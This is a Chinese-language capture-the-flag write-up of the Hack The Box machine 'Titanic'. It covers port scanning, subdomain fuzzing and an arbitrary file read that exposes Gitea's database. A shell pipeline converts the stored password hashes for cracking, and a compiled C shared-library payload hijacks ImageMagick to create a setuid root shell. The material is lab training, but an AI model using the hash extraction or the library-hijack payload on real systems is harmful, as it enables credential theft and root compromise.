## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Titanic
2. 難度:Easy
3. IP:10.129.231.221

### 主要發現：
1. 漏洞 ：（風險等級：）
2. 漏洞 ：（風險等級：）

### 攻擊鏈摘要：

### 潛在影響：

### 修復建議：

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放服務

```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.231.221 -oA portscan/ports
sudo nmap -sU -Pn --top-ports 20 10.129.231.221 -oA portscan/udp
sudo nmap -sT -Pn -sV -sC -O -p99,22,80 10.129.231.221 -oA portscan/detial
sudo nmap --script=vuln -p22,80 10.129.231.221 -oA portscan/vuln
```

<img width="807" height="301" alt="螢幕擷取畫面 2026-06-07 215331" src="https://github.com/user-attachments/assets/0030efe3-898c-4d5d-8c18-2cd631bb4102" />

<img width="631" height="576" alt="螢幕擷取畫面 2026-06-07 215340" src="https://github.com/user-attachments/assets/628362c7-47d8-45e2-9a3c-c1f642e673c1" />

<img width="1125" height="478" alt="螢幕擷取畫面 2026-06-07 215424" src="https://github.com/user-attachments/assets/dac814c4-71f3-4646-be10-99ed532862a7" />

<img width="647" height="289" alt="螢幕擷取畫面 2026-06-07 215500" src="https://github.com/user-attachments/assets/06db4ce9-703c-4de3-a441-68283b1d5b2c" />

將詳細訊息掃描獲得的域名寫入/etc/hosts

<img width="505" height="244" alt="螢幕擷取畫面 2026-06-07 215540" src="https://github.com/user-attachments/assets/d244df46-e688-4ba7-8434-bc5c33cc9777" />

使用whatweb確認HTTP/80的詳細訊息

<img width="1898" height="118" alt="螢幕擷取畫面 2026-06-07 215612" src="https://github.com/user-attachments/assets/f3efc269-ddbe-4efe-a1cd-87016aef49ac" />

確認HTTP/80的主頁

<img width="1908" height="850" alt="螢幕擷取畫面 2026-06-07 215752" src="https://github.com/user-attachments/assets/b1d51ed6-87c5-4c3e-a24f-be02a282bf83" />

有一個預定功能，確認之後會下載檔案，內容是輸入內容的JSON

<img width="1289" height="615" alt="螢幕擷取畫面 2026-06-07 215934" src="https://github.com/user-attachments/assets/d1c53667-52a9-4b3a-93ab-1b3422709a71" />


### 2.2 枚舉(Enumeration)

使用Gobuster枚舉目錄

```bash
sudo gobuster dir -u http://titanic.htb -w /usr/share/wordlists/dirb/common.txt -x txt,py,tar,bak
```

<img width="922" height="471" alt="螢幕擷取畫面 2026-06-07 220505" src="https://github.com/user-attachments/assets/33b04021-2efc-46e8-a61c-bf08d7c9cb0f" />

因HTTP/80幾乎為靜態網站，包含預定功能幾乎沒有什麼攻擊面，我使用ffuf模糊測試子域名

```bash
sudo ffuf -u http://10.129.231.221 -H "HOST: FUZZ.titanic.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc all -ac
```

<img width="1439" height="516" alt="螢幕擷取畫面 2026-06-07 220613" src="https://github.com/user-attachments/assets/6010a887-ee7f-4df7-8699-5c441d5529f3" />

將獲得的子域名寫入/etc/hosts

<img width="499" height="242" alt="螢幕擷取畫面 2026-06-07 220656" src="https://github.com/user-attachments/assets/f006e22d-84ad-4a5b-82d2-c9e08fed5d55" />

dev子域名連接到一個Gitea網站，有註冊和登入功能

<img width="1912" height="858" alt="螢幕擷取畫面 2026-06-07 220758" src="https://github.com/user-attachments/assets/1ee7b64d-700d-49b9-8ff5-c31bd2832b56" />

使用Gobuster枚舉子目錄

```bash
sudo gobuster dir -u http://dev.titanic.htb -w /usr/share/wordlists/dirb/common.txt
```

<img width="805" height="563" alt="螢幕擷取畫面 2026-06-07 221523" src="https://github.com/user-attachments/assets/ca0e1f08-fe2b-46a9-b98a-f255ccb89f30" />


### 2.3 初始存取(Initial Access)

在/developer裡有兩個項目

<img width="1396" height="505" alt="螢幕擷取畫面 2026-06-07 221840" src="https://github.com/user-attachments/assets/c88ce45f-515d-49a0-ba44-fbb72df4e2b9" />

docker-config裡有一些路徑跟資料庫憑證

<img width="1380" height="780" alt="螢幕擷取畫面 2026-06-07 221851" src="https://github.com/user-attachments/assets/38c341ca-65d7-47e8-86e5-7dc3e21c6b34" />

<img width="1356" height="496" alt="螢幕擷取畫面 2026-06-07 221952" src="https://github.com/user-attachments/assets/49ba6fae-93d6-436c-be02-1acd7c54437a" />

<img width="1412" height="666" alt="螢幕擷取畫面 2026-06-07 222006" src="https://github.com/user-attachments/assets/c798b31e-3ff5-4a91-b3fb-90a766ef210c" />

在flask-app裡有原始碼

<img width="1317" height="738" alt="螢幕擷取畫面 2026-06-07 222033" src="https://github.com/user-attachments/assets/d53df809-4f29-4e11-822b-74b15970a215" />

<img width="1371" height="745" alt="螢幕擷取畫面 2026-06-07 222143" src="https://github.com/user-attachments/assets/e0bd47ef-6a87-4463-957b-0e5eb1295455" />

在圖中這段，可以得知原始碼對使用者輸入並沒有進行過濾，因為是輸入檔案名，可以嘗試任意檔案讀取漏洞

<img width="612" height="305" alt="螢幕擷取畫面 2026-06-07 222326" src="https://github.com/user-attachments/assets/8473c258-11a2-41f7-9c70-904e00540f7d" />

使用curl確認漏洞存在，並導出/etc/passwd，確認擁有/bin/bash的只有root和developer

<img width="825" height="739" alt="螢幕擷取畫面 2026-06-07 222925" src="https://github.com/user-attachments/assets/f44c5350-4c8f-4245-8525-6a3131ab67f9" />

在這裡其實已經可以導出user.txt，但我希望獲得Shell後再去取得，所以要去查詢有沒有遺漏的憑證，去Gitea的官網找尋設定檔路徑

<img width="1900" height="819" alt="螢幕擷取畫面 2026-06-07 223452" src="https://github.com/user-attachments/assets/e57a3af2-8d74-4624-865a-8b826c1cace5" />

在app.ini中可以看到資料庫路徑

<img width="837" height="733" alt="螢幕擷取畫面 2026-06-07 223956" src="https://github.com/user-attachments/assets/0cc28ba9-e35c-4837-9236-f94e0d4be1da" />

<img width="538" height="663" alt="螢幕擷取畫面 2026-06-07 224013" src="https://github.com/user-attachments/assets/41f111c3-73a6-49d6-87e5-fc3b590a6d46" />

使用-o參數將資料庫轉存至本機

<img width="918" height="111" alt="螢幕擷取畫面 2026-06-07 224120" src="https://github.com/user-attachments/assets/54e7291c-37f8-489b-8609-7b36aefd6c83" />

使用sqlist3枚舉資料庫

<img width="468" height="795" alt="螢幕擷取畫面 2026-06-07 224204" src="https://github.com/user-attachments/assets/1601e357-fb37-44f3-8278-c7a0a4d41a60" />

在user表中找到root跟developer密碼加密

<img width="1219" height="784" alt="螢幕擷取畫面 2026-06-07 224636" src="https://github.com/user-attachments/assets/7c708312-01f9-4507-9fcd-dc9a352e4867" />

<img width="1222" height="695" alt="螢幕擷取畫面 2026-06-07 224653" src="https://github.com/user-attachments/assets/6bd76d0e-ee1c-4621-a859-8fa615a387cb" />

從passwd_hash_algo的欄位內容可得知pbkdf2$50000$50，主演算法是PBKDF2，50000代表雜湊的迭代次數，50代表最終生成的金鑰長度，並且在Gitea官網上表明pbkdf2使用SHA-256，導出時需要順便處理

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | 
while read data; do 
digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); 
salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); 
name=$(echo $data | cut -d'|' -f 3); 
echo "${name}:sha256:50000:${salt}:${digest}"; 
done | tee hash
```

此處為了看清楚，我在語意轉折處換行，以下參數說明：
1. sqlite3 gitea.db "select passwd,salt,name from user"：從user表導出這些參數
2. | while read data; do ... done：透過管線將查詢結果逐行傳給while迴圈處理，每行資料暫存於$data變數。
3. cut -d'|' -fn：取出第n個欄位，此時通常是十六進位字串。
4. xxd -r -p：將十六進位字串還原回原始的二進位資料。
5. base64：將二進位資料編碼為Base64字串。
6. echo "${name}:sha256:50000:${salt}:${digest}"：格式化輸出。
7. | tee：結果印出並存成檔案。

<img width="1919" height="120" alt="螢幕擷取畫面 2026-06-07 232631" src="https://github.com/user-attachments/assets/6bf98128-5fcf-4b91-9c76-2e5d65ec8652" />

將結果丟給Hashcat後得到developer的密碼

<img width="1116" height="345" alt="螢幕擷取畫面 2026-06-07 232906" src="https://github.com/user-attachments/assets/3e058401-a0cc-467b-9392-25d0a7693506" />

以SSH連線成功

<img width="752" height="749" alt="螢幕擷取畫面 2026-06-07 233003" src="https://github.com/user-attachments/assets/483afbdf-61fd-48cc-bcc9-29bc4cf4c894" />

在家目錄中獲得user.txt

<img width="387" height="135" alt="螢幕擷取畫面 2026-06-07 233148" src="https://github.com/user-attachments/assets/22cb9aa0-320a-45b6-9a64-2b638b0a07b9" />

### 2.4 權限提升(Privilege Escalation)

經過簡單枚舉後並未獲得明顯提權點，在/opt/scipts中找到一個.sh腳本，是以自動任務的形式啟動中

<img width="1107" height="288" alt="螢幕擷取畫面 2026-06-07 234142" src="https://github.com/user-attachments/assets/d93db5ff-95d0-4850-980b-49808f832454" />

其中使用到的ImageMagick的版本有公開漏洞

<img width="1289" height="160" alt="螢幕擷取畫面 2026-06-07 234622" src="https://github.com/user-attachments/assets/f56c8214-8c64-4aa2-8561-79277881425c" />

<img width="1337" height="775" alt="螢幕擷取畫面 2026-06-07 234819" src="https://github.com/user-attachments/assets/d6776787-faa4-4ae4-8e88-93a78c823537" />

<img width="1103" height="670" alt="螢幕擷取畫面 2026-06-07 235024" src="https://github.com/user-attachments/assets/7cf8af66-ab79-4d35-8ead-e78b2afbf344" />

某些版本的ImageMagick編譯方式，導致目前工作目錄被包含在設定檔和共用函式庫的搜尋路徑中，在同一目錄下建立一個名為libxcb.so.1的共用程式庫，此共享庫用於與X11視窗系統進行底層互動。需要注意的是，它由ImageMagick加載，而由於當前目錄在ImageMagick的路徑檢查範圍內，因此它會嘗試從此處加載。

先移動到腳本指定的/opt/app/atatic/assets/images/，使用PoC的方法建立共享庫，並且將id改成複製/bin/bash成/tmp/proof，並靜待任務自行啟動
```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/proof; chmod 6777 /tmp/proof");
    exit(0);
}
EOF
```

<img width="1008" height="325" alt="螢幕擷取畫面 2026-06-07 235312" src="https://github.com/user-attachments/assets/0913ce4c-2fee-4477-8fb7-2983800b0110" />

使用-p參數保留權限

<img width="703" height="175" alt="螢幕擷取畫面 2026-06-07 235335" src="https://github.com/user-attachments/assets/e41b82e5-a7af-41f6-a48d-36fbc7c1b6ce" />

### 2.5 最終成果(Impact)

獲得root.txt

<img width="1244" height="810" alt="螢幕擷取畫面 2026-06-07 235419" src="https://github.com/user-attachments/assets/d922cfea-996b-4137-8f17-d866ab76fe46" />


---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：
### 浪費時間的部分：
### 新知識點：
### 與實戰對應：
